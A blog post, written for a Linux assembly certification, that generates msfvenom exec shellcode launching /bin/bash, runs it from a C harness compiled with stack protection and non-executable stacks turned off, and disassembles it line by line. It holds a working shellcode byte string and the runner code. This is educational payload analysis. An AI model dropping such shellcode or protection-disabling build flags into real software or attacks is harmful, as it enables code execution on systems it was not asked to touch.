# Shellcode No.3 - Exec Command

<p style="text-align: justify;">At third glance, we'll take payload linux/x86/exec, for /bin/bash executing.</p>

------------------------------------------------------------------------------------------------------------------------
<p style="text-align: justify;">Again, we'll use msfvenom for shellcode generation:</p>

```sh
$ msfvenom -p linux/x86/exec CMD=/bin/bash -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 45 bytes
Final size of c file: 213 bytes
unsigned char buf[] =
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0a\x00\x00\x00\x2f"
"\x62\x69\x6e\x2f\x62\x61\x73\x68\x00\x57\x53\x89\xe1\xcd\x80";
```
------------------------------------------------------------------------------------------------------------------------
shellcode.c wrapped updating:
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0a\x00\x00\x00\x2f"
"\x62\x69\x6e\x2f\x62\x61\x73\x68\x00\x57\x53\x89\xe1\xcd\x80";


main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```
------------------------------------------------------------------------------------------------------------------------
Compiling:
```sh
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```
------------------------------------------------------------------------------------------------------------------------
<p style="text-align: justify;">In the second terminal we can check the processes opened using "ps" command:</p>

```sh
$ ps
  PID TTY          TIME CMD
16395 pts/0    00:00:00 bash
27003 pts/0    00:00:00 ps
$ ./shellcode 
Shellcode Length:  15
$ ps
  PID TTY          TIME CMD
16395 pts/0    00:00:00 bash
27004 pts/0    00:00:00 sh
27005 pts/0    00:00:00 bash
27058 pts/0    00:00:00 ps
```

<p style="text-align: justify;">Fantastic, everything works fine. As we see, again there are some null bytes, which breaks our "Shellcode Length" counter.</p>

------------------------------------------------------------------------------------------------------------------------
Let's use ndisasm again.
```sh
$ echo -ne "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0a\x00\x00\x00\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x00\x57\x53\x89\xe1\xcd\x80" | ndisasm -u -
```
```nasm
00000000  6A0B              push byte +0xb
00000002  58                pop eax
00000003  99                cdq
00000004  52                push edx
00000005  66682D63          push word 0x632d
00000009  89E7              mov edi,esp
0000000B  682F736800        push dword 0x68732f
00000010  682F62696E        push dword 0x6e69622f
00000015  89E3              mov ebx,esp
00000017  52                push edx
00000018  E80A000000        call dword 0x27
0000001D  2F                das
0000001E  62696E            bound ebp,[ecx+0x6e]
00000021  2F                das
00000022  626173            bound esp,[ecx+0x73]
00000025  6800575389        push dword 0x89535700
0000002A  E1CD              loope 0xfffffff9
0000002C  80                db 0x80
```
------------------------------------------------------------------------------------------------------------------------

<p style="text-align: justify;">The analysis of this shellcode will not be divided into different parts. </p>

- Pushing value 11 on the stack (for execve())
```nasm
00000000  6A0B              push byte +0xb
```
- Moving that value into EAX
```nasm
00000002  58                pop eax
```
- Modern EDX cleaning (0x0)
```nasm
00000003  99                cdq
```
- Pushing 0 on the stack (string terminator)
```nasm
00000004  52                push edx
```
- Pushing '-c' string on the stack - this is a /bin/sh parametr
```nasm
00000005  66682D63          push word 0x632d
```
- EDI points at top of the stack (ESP) for "-c"
```nasm
00000009  89E7              mov edi,esp
```
- Pushing "/sh" on the stack
```nasm
0000000B  682F736800        push dword 0x68732f
```
- Pushing "/bin" on the stack
```nasm
00000010  682F62696E        push dword 0x6e69622f
```
- EBX points at top of the stack (ESP) for "/bin/sh"
```nasm
00000015  89E3              mov ebx,esp
```
- Pushing 0 on the stack (string terminator)
```nasm
00000017  52                push edx
```
- Here we are using call instruction for pushing address of the '/bin/bash' string on the stack (that string is places right after call instruction). Call "orders" us to jump to 0x27, because that's where our string + null terminator ends
```nasm
00000018  E80A000000        call dword 0x27
```
- /bin/bas string, note "H" is missing
```nasm
0000001D  2F                das
0000001E  62696E            bound ebp,[ecx+0x6e]
00000021  2F                das
00000022  626173            bound esp,[ecx+0x73]
```
- Here, we have our missing "H", null terminator (\x00) and finally our 0x27 from call
```nasm
00000025  6800575389        push dword 0x89535700
```
We will check what is hidden, using ndisasm again. 
```sh
$ echo -ne "\x57\x53\x89\xe1\xcd\x80" | ndisasm -u -
00000000  57                push edi
00000001  53                push ebx
00000002  89E1              mov ecx,esp
00000004  CD80              int 0x80
```
Great! Let's analyze the last instructions.
- Push our pointer to "-c" string
```nasm
00000000  57                push edi
```
- Push our pointer for "/bin/sh" string
```nasm
00000001  53                push ebx
```
- Moving top of the stack to the ECX registry, now stack looks like: 
	- "/bin/sh"
	- "-c"
	- "/bin/bash"
	- 0x00 -> argv terminator
```nasm
00000002  89E1              mov ecx,esp
```
- Execve() syscall execution
```nasm
00000004  CD80              int 0x80
```
------------------------------------------------------------------------------------------------------------------------

That's all, /bin/bash executes properly.

### Pwned. ###

-----------------------------------------------------------------------------
-----------------------------------------------------------------------------

<p style="text-align: justify;">This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: https://www.pentesteracademy.com/course?id=3</p>

Student ID: SLAE-1524

-----------------------------------------------------------------------------
-----------------------------------------------------------------------------
